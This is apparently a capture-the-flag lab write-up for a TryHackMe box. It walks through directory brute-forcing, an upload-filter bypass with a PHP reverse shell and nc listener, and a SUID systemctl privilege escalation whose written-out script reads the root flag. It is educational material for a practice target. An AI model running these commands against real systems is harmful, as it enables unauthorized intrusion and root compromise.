## Initial foothold

If we go to http://10.10.72.158:3333/ we have a website.
However the content is not really useful for us.
We can run gobuster, that is how we find the folder internal
```
â”Œâ”€â”€(rootðŸ’€kali)-[~/Documents/tryhackme/vulnversity]
â””â”€# gobuster dir -u http://10.10.72.158:3333/ --wildcard -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt

- This a page with a file upload fonctionnality. This is perfect for a reverse shell  
![image](https://user-images.githubusercontent.com/96747355/167309849-79c67895-2633-4426-897a-7d7ad3aa1f5a.png)  
- After a few tries with burp, the accepted exentions is phtml. You can also fuzz it with burp intruder and make a grep match on "extension not allowed" to see which one will be allowed.
- We edit php revershell (on kali we have it preinstalled) `cp /usr/share/webshells/php/php-reverse-shell.php .` we rename it in the accepted extension `mv php-reverse-shell.php php-reverse-shell.phtml` 
- `nc -lvp 4444` We set up our listener
- Now as mentioned we just need to go to `http://<ip>:3333/internal/uploads/php-reverse-shell.phtml ` to execute our shell (if this was not specified we could have run gobuster in the internal folder
- We get a shell as `www-data`


## Privesc

- Now let's enumerate our ways to privesc
- `find / -perm -u=s -type f 2>/dev/null` We have a few files with suid bit on
```
/usr/bin/newuidmap
/usr/bin/chfn
/usr/bin/newgidmap
/usr/bin/sudo
/usr/bin/chsh
/usr/bin/passwd
/usr/bin/pkexec
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/at
/usr/lib/snapd/snap-confine
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/squid/pinger
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/bin/su
/bin/ntfs-3g
/bin/mount
/bin/ping6
/bin/umount
/bin/systemctl
/bin/ping
/bin/fusermount
/sbin/mount.cifs
```
- We have a GTFOBins entry for `/bin/systemctl` [here](https://gtfobins.github.io/gtfobins/systemctl/#suid)
- Let's try the exploitation
  - It creates a service in an env
  - It will create a temp file in the syst as a service
  - This will execute a command with bin/sh (in GTFObins it will execute id) in our case we could try to output our root flag in the output folder. It will then set a link and enable it
- Here is our modified script
```
TF=$(mktemp).service
echo '[Service]
ExecStart=/bin/sh -c "cat /root/root.txt > /tmp/output"
[Install]
WantedBy=multi-user.target' > $TF
/bin/systemctl link $TF
/bin/systemctl enable --now $TF
```
- Once we pasted all our commands above we just need to `cat /tmp/output` and this will give us the root flag.
